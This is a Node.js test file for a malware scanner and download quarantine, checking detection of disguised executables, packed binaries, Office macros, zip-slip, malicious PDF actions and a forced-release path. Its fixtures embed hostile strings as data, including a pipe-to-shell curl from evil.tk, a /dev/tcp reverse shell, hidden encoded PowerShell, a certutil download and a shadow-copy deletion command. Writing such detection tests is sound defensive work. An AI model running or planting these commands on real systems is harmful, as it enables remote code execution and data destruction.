'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const zlib = require('node:zlib');

const { scanFile, identify, checkFilename, inspectPdf, inspectZip, scanStrings } = require('../src/main/sandbox/scanner');
const { decide } = require('../src/main/soc/scoring');
const { Quarantine } = require('../src/main/sandbox/quarantine');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shadow-test-'));
const write = (name, buf) => { const p = path.join(tmp, name); fs.writeFileSync(p, buf); return p; };
const ids = (r) => r.signals.map((s) => s.id);

// --- helpers to build realistic samples ------------------------------------

function buildPe({ packed = false, strings = '' } = {}) {
  const dos = Buffer.alloc(0x80);
  dos.write('MZ', 0);
  dos.writeUInt32LE(0x80, 0x3c);
  const optSize = 0xe0;
  const sections = packed
    ? [['UPX0\0\0\0\0', 0x10000, 0, 0, 0xe0000080], ['UPX1\0\0\0\0', 0x1000, 0x200, 0x200, 0xe0000040]]
    : [['.text\0\0\0', 0x1000, 0x200, 0x200, 0x60000020], ['.rsrc\0\0\0', 0x1000, 0x200, 0x400, 0x40000040]];
  const header = Buffer.alloc(24);
  header.write('PE\0\0', 0);
  header.writeUInt16LE(0x14c, 4);
  header.writeUInt16LE(sections.length, 6);
  header.writeUInt32LE(Math.floor(Date.now() / 1000) - 86400 * 400, 8);
  header.writeUInt16LE(optSize, 20);
  header.writeUInt16LE(0x102, 22);
  const opt = Buffer.alloc(optSize);
  opt.writeUInt16LE(0x10b, 0);
  const secBufs = sections.map(([name, vsz, rsz, rptr, flags]) => {
    const b = Buffer.alloc(40);
    b.write(name, 0, 'latin1');
    b.writeUInt32LE(vsz, 8);
    b.writeUInt32LE(0x1000, 12);
    b.writeUInt32LE(rsz, 16);
    b.writeUInt32LE(rptr, 20);
    b.writeUInt32LE(flags, 36);
    return b;
  });
  let out = Buffer.concat([dos, header, opt, ...secBufs]);
  out = Buffer.concat([out, Buffer.alloc(Math.max(0, 0x600 - out.length))]);
  return Buffer.concat([out, Buffer.from(strings, 'latin1'), Buffer.alloc(1024)]);
}

/** Minimal but structurally valid zip, built by hand (no external tools). */
function buildZip(entries) {
  const locals = [];
  const central = [];
  let offset = 0;
  for (const [name, content, encrypted] of entries) {
    const nameBuf = Buffer.from(name, 'utf8');
    const data = Buffer.from(content || '', 'utf8');
    const lf = Buffer.alloc(30);
    lf.writeUInt32LE(0x04034b50, 0);
    lf.writeUInt16LE(20, 4);
    lf.writeUInt16LE(encrypted ? 1 : 0, 6);
    lf.writeUInt32LE(data.length, 18);
    lf.writeUInt32LE(data.length, 22);
    lf.writeUInt16LE(nameBuf.length, 26);
    const localRec = Buffer.concat([lf, nameBuf, data]);
    locals.push(localRec);

    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE(encrypted ? 1 : 0, 8);
    cd.writeUInt32LE(data.length, 20);
    cd.writeUInt32LE(data.length, 24);
    cd.writeUInt16LE(nameBuf.length, 28);
    cd.writeUInt32LE(offset, 42);
    central.push(Buffer.concat([cd, nameBuf]));
    offset += localRec.length;
  }
  const localsBuf = Buffer.concat(locals);
  const centralBuf = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralBuf.length, 12);
  eocd.writeUInt32LE(localsBuf.length, 16);
  return Buffer.concat([localsBuf, centralBuf, eocd]);
}

// --- tests -----------------------------------------------------------------

test('file type comes from content, not the name', () => {
  assert.equal(identify(buildPe()).type, 'pe');
  assert.equal(identify(Buffer.from('%PDF-1.7\n...')).type, 'pdf');
  assert.equal(identify(Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0])).type, 'elf');
  assert.equal(identify(Buffer.from('hello world, plain text here')).type, 'text');
});

test('an executable wearing a document extension is caught', async () => {
  const p = write('report.pdf', buildPe());
  const r = await scanFile(p, { originalName: 'report.pdf' });
  assert.ok(ids(r).includes('file.type-mismatch'));
  assert.equal(decide(r.signals, { mode: 'balanced' }).verdict, 'block');
});

test('double extensions are caught', () => {
  const r = checkFilename('invoice.pdf.exe');
  assert.ok(r.signals.some((s) => s.id === 'file.double-extension'));
});

test('right-to-left override filenames are caught', () => {
  const name = `invoice${String.fromCharCode(0x202e)}gpj.exe`;
  const r = checkFilename(name);
  assert.ok(r.signals.some((s) => s.id === 'file.rtl-override' && s.severity === 'critical'));
});

test('packed executables are flagged', async () => {
  const p = write('setup.exe', buildPe({ packed: true }));
  const r = await scanFile(p, { originalName: 'setup.exe' });
  assert.ok(ids(r).includes('pe.known-packer'));
  assert.ok(ids(r).includes('pe.wx-section'));
});

test('living-off-the-land command lines are found in binaries', async () => {
  const p = write('tool.bin', buildPe({
    strings: 'powershell.exe -nop -w hidden -enc SQBFAFgA\0certutil.exe -urlcache -f http://x/y\0',
  }));
  const r = await scanFile(p, { originalName: 'tool.bin' });
  const titles = r.signals.map((s) => s.title).join(' | ');
  assert.match(titles, /PowerShell/i);
  assert.match(titles, /certutil/i);
});

test('ransomware behaviour strings are treated as critical', async () => {
  const p = write('x.bin', Buffer.from('MZ\x90\x00' + 'A'.repeat(200) + 'vssadmin delete shadows /all /quiet'));
  const r = await scanFile(p, { originalName: 'x.bin' });
  assert.ok(r.signals.some((s) => s.severity === 'critical' && /shadow-copy/i.test(s.title)));
});

test('Office macro documents are flagged', () => {
  const zip = buildZip([['[Content_Types].xml', '<x/>'], ['word/vbaProject.bin', 'macro']]);
  const r = inspectZip(zip, 'invoice.docm');
  assert.ok(r.signals.some((s) => s.id === 'zip.macro' && s.severity === 'critical'));
});

test('executables and shortcuts inside archives are flagged', () => {
  const zip = buildZip([['readme.txt', 'hi'], ['setup.exe', 'MZ'], ['open-me.lnk', 'L']]);
  const r = inspectZip(zip, 'files.zip');
  assert.ok(r.signals.some((s) => s.id === 'zip.executable-inside'));
  assert.ok(r.signals.some((s) => s.id === 'zip.lnk-inside'));
});

test('zip-slip path traversal is caught', () => {
  const zip = buildZip([['../../../etc/cron.d/evil', 'x']]);
  const r = inspectZip(zip, 'update.zip');
  assert.ok(r.signals.some((s) => s.id === 'zip.path-traversal' && s.severity === 'critical'));
});

test('encrypted archives are flagged as un-scannable', () => {
  const zip = buildZip([['payload.bin', 'secret', true]]);
  const r = inspectZip(zip, 'protected.zip');
  assert.ok(r.signals.some((s) => s.id === 'zip.encrypted'));
});

test('malicious PDF actions are found, including inside deflated streams', () => {
  const plain = Buffer.from('%PDF-1.4\n<</OpenAction<</S/JavaScript/JS(evil())>>>>\n<</S/Launch/F(cmd.exe)>>');
  const r1 = inspectPdf(plain);
  assert.ok(r1.signals.some((s) => s.id === 'pdf.launch' && s.severity === 'critical'));
  assert.ok(r1.signals.some((s) => s.id === 'pdf.javascript'));

  const hidden = zlib.deflateSync(Buffer.from('<</S/Launch/F(calc.exe)>>'));
  const wrapped = Buffer.concat([
    Buffer.from('%PDF-1.4\n1 0 obj<</Length 99/Filter/FlateDecode>>stream\n'),
    hidden,
    Buffer.from('\nendstream endobj'),
  ]);
  const r2 = inspectPdf(wrapped);
  assert.ok(r2.signals.some((s) => s.id === 'pdf.launch'), 'should decompress and find the hidden /Launch');
});

test('benign files stay quiet', async () => {
  const png = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.alloc(2048, 0x11),
  ]);
  const r = await scanFile(write('photo.png', png), { originalName: 'photo.png' });
  assert.equal(decide(r.signals, { mode: 'balanced' }).verdict, 'allow');

  const txt = await scanFile(write('notes.txt', Buffer.from('Shopping list\nmilk\nbread\n')), { originalName: 'notes.txt' });
  assert.equal(decide(txt.signals, { mode: 'balanced' }).verdict, 'allow');

  const doc = buildZip([['[Content_Types].xml', '<x/>'], ['word/document.xml', '<p>hello</p>']]);
  const docx = await scanFile(write('letter.docx', doc), { originalName: 'letter.docx' });
  assert.equal(decide(docx.signals, { mode: 'balanced' }).verdict, 'allow');
});

test('a server MIME type that contradicts the content is caught', async () => {
  const p = write('image.png', buildPe());
  const r = await scanFile(p, { originalName: 'image.png', mimeType: 'image/png' });
  assert.ok(ids(r).includes('file.mime-lie'));
});

test('hashes are computed for every file', async () => {
  const r = await scanFile(write('h.bin', Buffer.from('abc')), { originalName: 'h.bin' });
  assert.equal(r.hashes.sha256, 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
});

test('embedded reverse shells and pipe-to-shell are detected', () => {
  const hits = scanStrings(Buffer.from('curl -s http://evil.tk/a.sh | sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1'));
  const labels = hits.map((h) => h.label).join(', ');
  assert.match(labels, /piped straight into a shell/);
  assert.match(labels, /reverse shell/);
});

test('quarantine neutralises names and refuses to release blocked files', async () => {
  const qdir = fs.mkdtempSync(path.join(os.tmpdir(), 'shadow-q-'));
  const settings = { get: (k) => ({ 'sandbox.mode': 'balanced', 'sandbox.releaseDir': path.join(qdir, 'out') }[k]) };
  const q = new Quarantine({ dir: qdir, settings });

  const rec = q.reserve('../../../evil.pdf.exe', { sourceUrl: 'http://gofile.io/x' });
  assert.ok(!rec.originalName.includes('..'), 'path traversal must be stripped');
  assert.ok(rec.savePath.endsWith('.quarantined'), 'saved name must not be runnable');
  assert.ok(rec.savePath.startsWith(qdir), 'must stay inside the quarantine directory');

  fs.writeFileSync(rec.savePath, buildPe({ packed: true, strings: 'powershell -nop -w hidden -enc AAAA' }));
  const done = await q.complete(rec.id);

  assert.equal(done.state, 'quarantined');
  assert.equal(done.verdict.verdict, 'block');
  assert.throws(() => q.release(rec.id), (err) => err.code === 'BLOCKED');

  // Forcing it through works, and is recorded as forced.
  const released = q.release(rec.id, { force: true });
  assert.equal(released.released.forced, true);
  assert.ok(fs.existsSync(released.released.path));

  fs.rmSync(qdir, { recursive: true, force: true });
});

test('a clean download can be released without force', async () => {
  const qdir = fs.mkdtempSync(path.join(os.tmpdir(), 'shadow-q2-'));
  const settings = { get: (k) => ({ 'sandbox.mode': 'balanced', 'sandbox.releaseDir': path.join(qdir, 'out') }[k]) };
  const q = new Quarantine({ dir: qdir, settings });
  const rec = q.reserve('holiday.png', { sourceUrl: 'https://example.com/holiday.png' });
  fs.writeFileSync(rec.savePath, Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(1024, 7),
  ]));
  const done = await q.complete(rec.id);
  assert.equal(done.verdict.verdict, 'allow');
  const out = q.release(rec.id);
  assert.ok(fs.existsSync(out.released.path));
  fs.rmSync(qdir, { recursive: true, force: true });
});

test.after(() => fs.rmSync(tmp, { recursive: true, force: true }));
